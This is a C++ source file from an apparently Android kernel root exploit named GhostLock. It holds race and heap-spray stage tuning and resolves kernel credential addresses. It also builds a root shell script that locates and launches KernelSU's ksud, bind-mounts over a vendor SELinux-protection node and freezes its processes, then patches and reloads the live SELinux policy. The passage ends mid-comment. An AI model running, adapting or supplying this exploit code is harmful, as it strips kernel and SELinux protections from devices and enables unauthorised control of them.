/*
 * GhostLock — attack primitives, launch/profile selection and timing.
 *
 * Split out of main.cpp so the orchestration entry stays a thin adapter. The
 * statement order and log text are unchanged from the original translation
 * unit.
 */

#include "attack/ops.hpp"
#include "support/fatal_error.hpp"

#include "session/exploit_session.hpp"

#include <algorithm>
#include <array>
#include <string>
#include <string_view>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/utsname.h>

namespace ghostlock::attack {
    void log_execution_settings(const profile::kernel_offsets *profile) {
        if (!profile) return;
        const profile::execution_settings *e = &profile->execution;
        const auto log_exec = [](const char *key, auto value) {
            pr_info("debug.execution.%s=%u\n", key, static_cast<unsigned>(value));
        };
        pr_info("debug.execution.begin release=%s\n", profile->uname_r);
        log_exec("recommended_cpus.main", e->recommended_main_cpu);
        log_exec("recommended_cpus.consumer", e->recommended_consumer_cpu);
        log_exec("selected_cpus.main", config::runtime_config_snapshot().main_cpu);
        log_exec("selected_cpus.consumer", config::runtime_config_snapshot().consumer_cpu);
        log_exec("heap.prepare_max_attempts", e->heap_prepare_max_attempts);
        log_exec("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
        log_exec("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
        log_exec("race.route_wait_ms", e->race_route_wait_ms);
        log_exec("race.setup_settle_us", e->race_setup_settle_us);
        log_exec("race.state_poll_interval_us", e->race_state_poll_interval_us);
        log_exec("stages.w1_attempts", e->w1_attempts);
        log_exec("stages.w1_settle_us", e->w1_settle_us);
        log_exec("stages.w1_scratch_repair_attempts", e->w1_scratch_repair_attempts);
        log_exec("stages.w2_attempts", e->w2_attempts);
        log_exec("stages.w2_settle_us", e->w2_settle_us);
        log_exec("stages.w3_chain_rounds", e->w3_chain_rounds);
        log_exec("stages.w3_attempts", e->w3_attempts);
        log_exec("stages.w3_settle_us", e->w3_settle_us);
        log_exec("routes.tcp_zerocopy.attempts", e->tcp_attempts);
        log_exec("routes.tcp_zerocopy.arm_sequence", e->tcp_arm_sequence);
        log_exec("routes.tcp_zerocopy.post_receive_hold_iterations",
                 e->tcp_post_receive_hold_iterations);
        log_exec("routes.select_stack.enter_delay_us", e->select_enter_delay_us);
        log_exec("routes.select_stack.timeout_us", e->select_timeout_us);
        log_exec("routes.select_stack.consumer_max_calls", e->select_consumer_max_calls);
        log_exec("routes.select_stack.consumer_burst_calls",
                 e->select_consumer_burst_calls);
        log_exec("handoff.pre_dispatch_settle_ms", e->handoff_pre_dispatch_settle_ms);
        log_exec("handoff.module_poll_attempts", e->handoff_module_poll_attempts);
        log_exec("handoff.module_poll_interval_ms", e->handoff_module_poll_interval_ms);
        log_exec("handoff.enforce_poll_attempts", e->handoff_enforce_poll_attempts);
        log_exec("handoff.enforce_poll_interval_ms", e->handoff_enforce_poll_interval_ms);
        pr_info("debug.execution.end\n");
    }

    /* Entries carry a phys load address only when measured; otherwise MTK uses
     * the DRAM base, xring its constant, qcom its GKI version. */
    void resolve_profile_addresses(void) {
        if (session::g_exploit_session.addresses.init(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        pr_info("soc: %s; kernel_phys_load=0x%llx\n",
                session::g_exploit_session.addresses.soc_name(&session::g_exploit_session.profile),
                (unsigned long long) session::g_exploit_session.addresses.phys_load());
        pr_info("init_cred image=%016zx alias=%016zx\n",
                (size_t) session::g_exploit_session.addresses.init_cred_image_addr(),
                (size_t) session::g_exploit_session.addresses.data_alias(
                    session::g_exploit_session.addresses.init_cred_image_addr()));
    }

    void install_profile(const profile::kernel_offsets &decoded) {
        struct utsname uts;
        if (uname(&uts) < 0) throw FatalError{};
        pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
        if (std::string_view(uts.release) != TARGET_KERNEL_RELEASE) {
            pr_error("build requires kernel %s, got %s\n",
                     TARGET_KERNEL_RELEASE, uts.release);
            throw FatalError{};
        }
#endif
        if (!decoded.uname_r || std::string_view(decoded.uname_r) != uts.release) {
            pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
                     decoded.uname_r ? decoded.uname_r : "<missing>");
            throw FatalError{};
        }
        /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
         * the native side only consumes the resolved values. */
        session::g_exploit_session.profile = profile::TargetProfile::from(&decoded);
        /* The multicast and sigreturn routes stamp the compact eleven-word
         * `rt_mutex_waiter` strip. A 6.6+ image's `rt_waiter_node` shape is a
         * different object (handing the walk `pi_tree.rb_left` as `lock`), so
         * a profile that selects either on such a device is refused here --
         * the extractor already refuses to emit one. This is the runtime guard
         * for a hand-edited or imported document. */
        const auto route = session::g_exploit_session.profile.route();
        const auto fallback = session::g_exploit_session.profile.fallback_route();
        const auto guarded = [](profile::RouteKind kind) {
            return kind == profile::RouteKind::MulticastWaiter ||
                   kind == profile::RouteKind::Sigreturn;
        };
        if ((guarded(route) || guarded(fallback)) &&
            !session::g_exploit_session.profile.waiter_is_compact()) {
            const auto offending = guarded(route) ? route : fallback;
            pr_error("profile route %s needs the compact rt_mutex_waiter strip; "
                     "this profile's waiter is the 6.6+ rt_waiter_node shape\n",
                     offending == profile::RouteKind::MulticastWaiter
                             ? "multicast_waiter"
                             : "sigreturn");
            throw FatalError{};
        }
        pr_success("resolved profile loaded: %s\n",
                   session::g_exploit_session.profile.release());
        if (config::runtime_config_snapshot().apply_profile(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        config::runtime_config_snapshot().log();
        log_execution_settings(session::g_exploit_session.profile.values());
        resolve_profile_addresses();
    }

    /* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
     * A nested bank lies inside its parent, so it cannot widen either bound. */
    static int32_t iomem_map_span(FILE *f, uint64_t *map_span,
                                  kernel::direct_map_bank *banks, size_t *bank_count) {
        unsigned long long base = 0, top = 0;
        char *line = nullptr;
        size_t cap = 0;
        int32_t found = 0;
        size_t count = 0;
        kernel::direct_map_bank physical[kernel::MAX_DIRECT_MAP_BANKS]{};

        while (getline(&line, &cap, f) > 0) {
            size_t len = strlen(line);
            unsigned long long a, b;
            int32_t used = 0;

            while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
                line[--len] = '\0';
            }
            /* %n pins the match to the whole line, since sscanf returns 2 even when
             * a trailing literal mismatches */
            if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
                used == static_cast<int32_t>(len)) {
                if (!found || a < base) {
                    base = a;
                    found = 1;
                }
                if (b + 1 > top) top = b + 1;
                if (count < kernel::MAX_DIRECT_MAP_BANKS) {
                    physical[count].start = a;
                    physical[count].end = b + 1;
                    ++count;
                }
            }
        }
        /* Kept as the C getline/free pair: the ScopeExit experiment grew
         * run_setup_stage by 5 instructions (CPP17 review, rejected). */
        free(line);

        /* the map starts at the dram base the kernel rounded down to a gib, which
         * is what memstart_addr holds */
        base &= ~((1ULL << 30) - 1);
        if (!found || top <= base) return 0;
        *map_span = top - base;
        /* Convert the physical banks to direct-map VAs while `base` is known;
         * the caller validates the span before publishing them. */
        for (size_t i = 0; i < count; ++i) {
            banks[i].start = kernel::DIRECT_MAP_BASE + (physical[i].start - base);
            banks[i].end = kernel::DIRECT_MAP_BASE + (physical[i].end - base);
        }
        *bank_count = count;
        return 1;
    }

    /* A rooted run leaves its /proc/iomem in the home dir, the only source for
     * this unit's direct map size. */
    void apply_iomem_cache(void) {
        std::array < char, 320 > path{};
        std::array < char, 192 > stamp{};
        uint64_t span = 0;
        int32_t ok = 0;
        kernel::direct_map_bank banks[kernel::MAX_DIRECT_MAP_BANKS]{};
        size_t bank_count = 0;
        const profile::kernel_offsets *values =
                session::g_exploit_session.profile.values();
        const char *release = values && values->uname_r ? values->uname_r : "";

        snprintf(path.data(), path.size(), "%s/.ghostlock_iomem", (config::runtime_config_snapshot().home_dir.c_str()));
        if (FILE *f = fopen(path.data(), "r")) {
            auto close_iomem = ghostlock::support::make_scope_exit(
                [f]() noexcept { fclose(f); });
            /* the first line names the release that wrote the dump */
            if (fgets(stamp.data(), static_cast<int32_t>(stamp.size()), f)) {
                /* strcspn returns an index inside the buffer; the store writes the
                 * terminating NUL at worst on the last byte. */
                stamp[strcspn(stamp.data(), "\r\n")] = '\0'; // NOLINT(clang-analyzer-security.ArrayBound)
                const std::string_view stamp_view(stamp.data());
                ok = stamp_view.starts_with("# ") &&
                     stamp_view.substr(2) == release &&
                     iomem_map_span(f, &span, banks, &bank_count);
            }
        }

        /* the base is rounded down to a gib, so a span under that holds no real
         * bank, and the span has to cover the dram the unit reports. it also
         * stays inside the bound the built-in geometry already uses, so a measured
         * end can only narrow what this build would otherwise trust. an
         * unmeasurable ram rejects the dump */
        long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
        uint64_t dram = (pages > 0 && page_sz > 0)
                            ? static_cast<uint64_t>(pages) * static_cast<uint64_t>(page_sz)
                            : 0;
        if (!ok || !dram || span < (1ULL << 30) || span < dram ||
            span >= kernel::DIRECT_MAP_END - kernel::DIRECT_MAP_BASE) {
            kernel::g_direct_map_bank_count = 0;
            pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
            return;
        }

        kernel::g_direct_map_end = kernel::DIRECT_MAP_BASE + span;
        kernel::g_direct_map_bank_count = 0;
        for (size_t i = 0; i < bank_count && i < kernel::MAX_DIRECT_MAP_BANKS; ++i) {
            const uint64_t start = banks[i].start;
            const uint64_t end = std::min<uint64_t>(banks[i].end, kernel::g_direct_map_end);
            if (start < end)
                kernel::g_direct_map_banks[kernel::g_direct_map_bank_count++] = {start, end};
        }
        pr_info("iomem cache: direct_map_end=%016llx banks=%zu\n",
                (unsigned long long) kernel::g_direct_map_end,
                kernel::g_direct_map_bank_count);
    }

    void slab_drain(void) {
        /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
         * (exit 137) especially right before heap spray. */
        struct timespec up;
        clock_gettime(CLOCK_BOOTTIME, &up);
        int32_t waves = (up.tv_sec > 60) ? 2 : 1;
        int32_t batch = (up.tv_sec > 60) ? 64 : 32;
        for (int32_t wave = 0; wave < waves; wave++) {
            /* Fixed upper bound (batch <= 64): no heap and no vector exception
             * paths in this pre-attack drain. */
            std::array<support::ChildProcess, 64> drain;
            int32_t n = 0;
            for (int32_t i = 0; i < batch; i++) {
                pid_t pid = fork();
                if (pid == 0) {
                    pause();
                    _exit(0);
                }
                if (pid > 0) {
                    if (n >= static_cast<int32_t>(drain.size())) break;
                    drain[static_cast<size_t>(n++)] = support::ChildProcess(pid);
                } else {
                    break;
                }
            }
            /* kill + reap in the original order, now owned by ChildProcess */
            for (int32_t i = 0; i < n; i++) (void) drain[static_cast<size_t>(i)].terminate_and_wait(SIGKILL);
            sched_yield();
            usleep(20000);
        }
    }

    void write_root_script(void) {
        /* The SELinux enforce-write block adds ~2.5 KiB; 20 KiB keeps the
         * script well clear of the truncation guard below. */
        std::string script(20480, '\0');
        support::UniqueFd sfd(
            open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
        if (!sfd.valid()) {
            pr_warning("open root script failed path=%s errno=%d\n",
                       (config::runtime_config_snapshot().root_script_path.c_str()), errno);
            return;
        }

        int32_t n = snprintf(
            script.data(), script.size(),
            "#!/system/bin/sh\n"
            "HOME_DIR='%s'\n"
            "LOG='%s'\n"
            /* The app's files dir has failed to take this log before (one
             * transient EACCES on 2026-11-09). Fall back to a root-writable
             * path and announce it on stdout (the native captures stdout as
             * script-output), so the run still has a log somewhere. */
            "if ! ( : >>\"$LOG\" ) 2>/dev/null; then\n"
            "  LOG=\"${TMPDIR:-/data/local/tmp}/ghostlock-ksu-$$.log\"\n"
            "  echo \"LOG-FALLBACK=$LOG\"\n"
            "fi\n"
            /* Test hook: the app writes this file for the diagnostic A/B
             * arms. "noinstrument" disables the drain, the dump and the
             * probe, leaving the product path otherwise unchanged. */
            "MODE_FILE=\"$HOME_DIR/dirtyfrag.mode\"\n"
            "MODE_TEXT=$(cat \"$MODE_FILE\" 2>/dev/null)\n"
            "NO_INSTR=0\n"
            "case \"$MODE_TEXT\" in *noinstrument*) NO_INSTR=1 ;; esac\n"
            "SAFE_MODE=%d\n"
            "VRKO_SELINUX_BLOCK='%s'\n"
            "KSUD=\"$HOME_DIR/ksud\"\n"
            "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
            "chmod 644 \"$LOG\" 2>/dev/null\n"
            "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.rifsxd.ksunext*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/org.bakasu.bakasu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
            "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
            "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
            "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
            "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
            /* W1 leaves SELinux permissive; every post-W1 failure exit restores
             * it, so a run that cannot finish the root phase does not leave the
             * device permissive until reboot. Dumps are written before this
             * call: the dump path is blocked once enforcing is back. */
            "restore_enforce() {\n"
            "  e_reason=\"$1\"\n"
            "  e_before=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
            "  echo \"[*] enforcing restore: reason=$e_reason before=${e_before:-unreadable}\" >>\"$LOG\"\n"
            "  if echo 1 > /sys/fs/selinux/enforce 2>/dev/null; then e_wrote=1; else e_wrote=0; fi\n"
            "  e_after=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
            /* The DirtyFrag shell runs as toolbox, which may set but not read
             * the enforce node: the successful write is the fact the stage can
             * use. It goes to stdout, which survives the enforcing restore
             * where a $LOG write does not. */
            "  echo \"ENFORCE-RESTORE reason=$e_reason before=${e_before:-unreadable} wrote=$e_wrote readback=${e_after:-unreadable}\"\n"
            "}\n"
            "if [ \"$(id -u)\" -ne 0 ]; then\n"
            "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
            "  restore_enforce not-root\n"
            "  exit 1\n"
            "fi\n"
            /* Diagnostics for the Samsung mount path: the init shell's
             * capability set and whether it can mount at all. Unredirected on
             * purpose: the app's files dir may not be writable by this shell,
             * and the native's script-output captures stdout. */
            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
            "  echo \"CAPS: $(grep Cap /proc/self/status 2>/dev/null | tr '\\n' ' ')\"\n"
            "  if mount --bind /system/bin/lmkd /system/bin/lmkd 2>/dev/null; then\n"
            "    echo 'MOUNT-PROBE=ok'\n"
            "    umount -l /system/bin/lmkd 2>/dev/null\n"
            "  else\n"
            "    echo 'MOUNT-PROBE=fail'\n"
            "  fi\n"
            "fi\n"
            /* The SELinux enforce-write block runs here: after the root-uid
             * check and before the iomem cache and the policy fixup, so a
             * 5.10.198 daemon cannot set SELinux to enforcing during the
             * handoff's load/late-load. This blocks only the /proc/vrp 0/1
             * write; the module's other hooks and checks are untouched. The
             * mode is user-authoritative; Auto resolves from uname and the
             * node's presence. Nothing here is fatal, and nothing unmounts or
             * resumes: the device stays modified until reboot. */
            "vrko_selinux_block() {\n"
            "  mode=\"$VRKO_SELINUX_BLOCK\"\n"
            "  kernel=$(uname -r)\n"
            "  node=absent\n"
            "  [ -e /proc/vrp ] && node=present\n"
            "  rec=0\n"
            "  case \"$kernel\" in 5.10.198*) rec=1 ;; esac\n"
            "  if [ \"$mode\" = off ]; then\n"
            "    echo \"[*] vr.ko selinux block: mode=off recommended=$rec effective=0 kernel=$kernel node=$node reason=user-off\" >>\"$LOG\"\n"
            "    return 0\n"
            "  fi\n"
            "  if [ \"$node\" = absent ]; then\n"
            "    echo \"[*] vr.ko selinux block: mode=$mode recommended=$rec effective=0 kernel=$kernel node=absent reason=node-absent\" >>\"$LOG\"\n"
            "    return 0\n"
            "  fi\n"
            "  if [ \"$mode\" = on ]; then\n"
            "    eff=1; reason=user-on\n"
            "  else\n"
            "    eff=$rec\n"
            "    if [ \"$rec\" = 1 ]; then reason=auto-recommended; else reason=not-198-class; fi\n"
            "  fi\n"
            "  echo \"[*] vr.ko selinux block: mode=$mode recommended=$rec effective=$eff kernel=$kernel node=$node reason=$reason\" >>\"$LOG\"\n"
            "  [ \"$eff\" = 1 ] || return 0\n"
            "  myns=$(readlink /proc/self/ns/mnt 2>/dev/null)\n"
            "  echo \"[*] vr.ko selinux block: pre node=$(stat -c '%%F' /proc/vrp 2>/dev/null) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\" >>\"$LOG\"\n"
            "  scan_vrp() {\n"
            "    for f in /proc/[0-9]*/attr/current; do\n"
            "      [ -r \"$f\" ] || continue\n"
            "      ctx=$(cat \"$f\" 2>/dev/null) || continue\n"
            "      case \"$ctx\" in u:r:vrp*)\n"
            "        p=${f#/proc/}; p=${p%%/attr/current}\n"
            "        ns=$(readlink /proc/$p/ns/mnt 2>/dev/null)\n"
            "        fd=$(readlink /proc/$p/fd/* 2>/dev/null | grep -c '/proc/vrp')\n"
            "        echo \"$p|$ctx|$ns|$fd\"\n"
            "      esac\n"
            "    done\n"
            "  }\n"
            "  pre=$(scan_vrp)\n"
            "  echo \"[*] vr.ko selinux block: pre vrp=${pre:-none}\" >>\"$LOG\"\n"
            "  mount --bind /dev/null /proc/vrp 2>/dev/null; rc=$?\n"
            "  echo \"[*] vr.ko selinux block: bind rc=$rc node=$(stat -c '%%F' /proc/vrp 2>/dev/null) mi=$(grep -c ' /proc/vrp ' /proc/self/mountinfo 2>/dev/null)\" >>\"$LOG\"\n"
            "  stopped=\"\"\n"
            "  for e in $pre; do\n"
            "    p=${e%%%%|*}; ns=$(echo \"$e\" | cut -d'|' -f3); fd=$(echo \"$e\" | cut -d'|' -f4)\n"
            "    if [ \"$rc\" -ne 0 ] || [ \"$ns\" != \"$myns\" ] || [ \"$fd\" -gt 0 ] || [ ! -c /proc/vrp ]; then\n"
            "      kill -STOP \"$p\" 2>/dev/null && stopped=\"$stopped $p\"\n"
            "    fi\n"
            "  done\n"
            "  for p in $stopped; do\n"
            "    echo \"[*] vr.ko selinux block: stopped pid=$p $(grep -m1 '^State:' /proc/$p/status 2>/dev/null)\" >>\"$LOG\"\n"
            "  done\n"
            "  post=$(scan_vrp)\n"
            "  echo \"[*] vr.ko selinux block: post node=$(stat -c '%%F' /proc/vrp 2>/dev/null) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) vrp=${post:-none}\" >>\"$LOG\"\n"
            "  return 0\n"
            "}\n"
            "vrko_selinux_block\n"
            /* the rename is atomic, so a failed read leaves the old dump in place */
            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
            "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
            "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
            "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
            "else\n"
            "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
            "fi\n"
            /* measured-stride fact: /proc/slabinfo is root-only, so this is the
             * one phase that can measure the mm_struct slab stride. The app
             * ingests the file only after a completed run and keeps it as a
             * fact; it is never applied to a profile automatically. Atomic like
             * the iomem cache, and the app deletes the file before each run so
             * its presence proves this run's root phase wrote it. */
            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_slabinfo.new\"\n"
            "if grep -q '^mm_struct ' /proc/slabinfo 2>/dev/null && grep '^mm_struct ' /proc/slabinfo >>\"$HOME_DIR/.ghostlock_slabinfo.new\" 2>/dev/null; then\n"
            "  mv \"$HOME_DIR/.ghostlock_slabinfo.new\" \"$HOME_DIR/.ghostlock_slabinfo\"\n"
            "  chmod 644 \"$HOME_DIR/.ghostlock_slabinfo\" 2>/dev/null\n"
            "  echo \"[*] slabinfo: $(cat \"$HOME_DIR/.ghostlock_slabinfo\" | tail -1)\" >>\"$LOG\"\n"
            "else\n"
            "  rm -f \"$HOME_DIR/.ghostlock_slabinfo.new\"\n"
            "  echo '[!] slabinfo: /proc/slabinfo mm_struct read failed' >>\"$LOG\"\n"
            "fi\n"
            /* debug archive: copy kernel/pstore/iomem evidence into the
             * --dump-kernel-log directory (empty disables the dump). */
            "DEBUG_DIR=\"%s\"\n"
            /* Polled kernel-log drain: dmesg snapshot every 0.5 s, written
             * atomically and synced, so a reset leaves the last lines in the
             * debug dir (or the app's home dir). The loop also exits when the
             * parent shell is gone; the EXIT trap kills it normally. */
            "KMSG_LOG=\"\"\n"
            "KMSG_DRAIN_PID=\"\"\n"
            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
            "  if [ -n \"$DEBUG_DIR\" ]; then KMSG_LOG=\"$DEBUG_DIR/kmsg-live.txt\"; fi\n"
            "  if [ -z \"$KMSG_LOG\" ]; then KMSG_LOG=\"$HOME_DIR/kmsg-live.txt\"; fi\n"
            "  if ! ( : >\"$KMSG_LOG\" ) 2>/dev/null; then KMSG_LOG=\"/data/local/tmp/kmsg-live-$$.txt\"; fi\n"
            "  ( while kill -0 $$ 2>/dev/null; do timeout 2 dmesg 2>/dev/null | tail -n 300 >\"$KMSG_LOG.new\"; mv \"$KMSG_LOG.new\" \"$KMSG_LOG\" 2>/dev/null; sync; sleep 0.5; done ) &\n"
            "  KMSG_DRAIN_PID=$!\n"
            "  echo \"KMSG-DRAIN=$KMSG_LOG\"\n"
            "fi\n"
            "dump_debug() {\n"
            "  [ -n \"$DEBUG_DIR\" ] || return 0\n"
            "  [ \"$NO_INSTR\" -eq 0 ] || return 0\n"
            "  mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null || { echo \"[!] debug dump: cannot write $DEBUG_DIR\" >>\"$LOG\"; return 0; }\n"
            "  {\n"
            "    echo '== uname -a =='\n"
            "    uname -a\n"
            "    echo '== /proc/version =='\n"
            "    cat /proc/version\n"
            "    echo '== /proc/cmdline =='\n"
            "    cat /proc/cmdline\n"
            "    echo '== /proc/modules =='\n"
            "    cat /proc/modules\n"
            "    echo '== selinux =='\n"
            "    getenforce 2>/dev/null\n"
            "  } >\"$DEBUG_DIR/kernel-info.txt\" 2>&1\n"
            "  if ! timeout 2 dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
            "    echo '[!] dmesg unavailable' >>\"$DEBUG_DIR/kernel-dmesg.log\"\n"
            "  fi\n"
            "  for f in /sys/fs/pstore/*; do\n"
            "    [ -f \"$f\" ] || continue\n"
            "    cp \"$f\" \"$DEBUG_DIR/pstore/\" 2>/dev/null\n"
            /* The app's export zips top-level files only; keep the
             * subdirectory for a human, and put a flattened copy where the
             * zip will actually carry it. pstore is read on the next run's
             * shell (the app has no root at boot), so the previous boot's
             * crash lands in this run's folder. */
            "    cp \"$f\" \"$DEBUG_DIR/pstore-${f##*/}\" 2>/dev/null\n"
            "  done\n"
            "  cp /proc/iomem \"$DEBUG_DIR/iomem.txt\" 2>/dev/null\n"
            "  cp \"$LOG\" \"$DEBUG_DIR/ksu.log\" 2>/dev/null\n"
            /* The app has to read these back to put them in the exported zip,
             * and this shell writes them root-only (umask 022, but dmesg and
             * /proc/iomem land 600/400). The dump directory is the app's own,
             * so hand the files to it by mode rather than by owner. */
            "  chmod 644 \"$DEBUG_DIR\"/*.txt \"$DEBUG_DIR\"/*.log 2>/dev/null\n"
            "  chmod 755 \"$DEBUG_DIR\"/pstore 2>/dev/null\n"
            "  chmod 644 \"$DEBUG_DIR\"/pstore/* 2>/dev/null\n"
            "  chmod 644 \"$DEBUG_DIR\"/pstore-* 2>/dev/null\n"
            "  echo \"[*] debug dump written to $DEBUG_DIR\" >>\"$LOG\"\n"
            "}\n"
            "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
            "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
            "if grep -q ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null; then\n"
            "  umount -l /system/bin/lmkd 2>/dev/null\n"
            "  echo '[*] cleared a stale /system/bin/lmkd mount' >>\"$LOG\"\n"
            "fi\n"
            "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
            "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
            "fi\n"
            "# step 1: restore policy\n"
            /* The dump is a *working copy* -- patched in place, then handed to
             * load_policy -- never evidence, and nothing reads it afterwards.
             * It lives in the run's debug folder when the app asked for one, so
             * a run killed before its exit trap leaves it beside that run's
             * other dumps instead of growing app-private storage for ever;
             * /data/local/tmp (and then the app's own dir) are the fallbacks
             * for a run started without a debug folder. */
            "POLICY_DIR=\"${DEBUG_DIR:-/data/local/tmp}\"\n"
            "mkdir -p \"$POLICY_DIR\" 2>/dev/null\n"
            "[ -d \"$POLICY_DIR\" ] || POLICY_DIR=\"$HOME_DIR\"\n"
            "POLICY=\"$POLICY_DIR/ghostlock-selinux.policy\"\n"
            "printf '' >\"$POLICY\" 2>/dev/null || {\n"
            "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
            "  restore_enforce policy-dump\n"
            "  exit 1\n"
            "}\n"
            "trap '[ -n \"$KMSG_DRAIN_PID\" ] && kill $KMSG_DRAIN_PID 2>/dev/null; [ -n \"$KMSG_LOG\" ] && rm -f \"$KMSG_LOG.new\" 2>/dev/null; umount -l /system/bin/lmkd 2>/dev/null; rm -f \"$POLICY\"; [ \"${DUMP_DONE:-0}\" = 1 ] || dump_debug' EXIT\n"
            "prepare_policy() {\n"
            "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
            "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
            "  case \"$HEADER\" in\n"
            "    8cff7cf9080000005345204c696e7578"
            "\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?) ;;\n"
            "    *) echo '[!] invalid policy header'; return 1 ;;\n"
            "  esac\n"
            "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
            "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
            "  [ -n \"$CONFIG\" ] || return 1\n"
            "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\" || return 1)\n"
            "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
            "}\n"
            "FIXUP_RC=1\n"
            "for i in $(seq 1 10); do\n"
            "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
            "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
            "    sleep 2\n"
            "    continue\n"
            "  fi\n"
            "  BEFORE_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
            "  LPID=$!\n"
            "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
            "  SPID=$!\n"
            "  wait $LPID 2>/dev/null\n"
            "  FIXUP_RC=$?\n"
            "  kill $SPID 2>/dev/null\n"
            "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
            "    AFTER_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "    echo \"[*] policyload before=$BEFORE_POLICYLOAD after=$AFTER_POLICYLOAD\" >>\"$LOG\"\n"
            "    if [ -n \"$AFTER_POLICYLOAD\" ] && [ \"$AFTER_POLICYLOAD\" != \"$BEFORE_POLICYLOAD\" ]; then\n"
            "      break\n"
            "    fi\n"
            "    echo '[!] load_policy returned success without updating SELinux status' >>\"$LOG\"\n"
            "    FIXUP_RC=1\n"
            "  fi\n"
            "  sleep 2\n"
            "done\n"
            /* Test hook: dirtyfrag.mode "failfixup" forces the failure branch so
             * the failure-exit enforcing restore and the stage's DFRC verdict
             * can be exercised on a device whose late-load would succeed. */
            "case \"$MODE_TEXT\" in *failfixup*) echo '[*] test: forcing fixup failure' >>\"$LOG\"; FIXUP_RC=1 ;; esac\n"
            "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
            /* The working copy is spent once the policy loaded: delete it here,
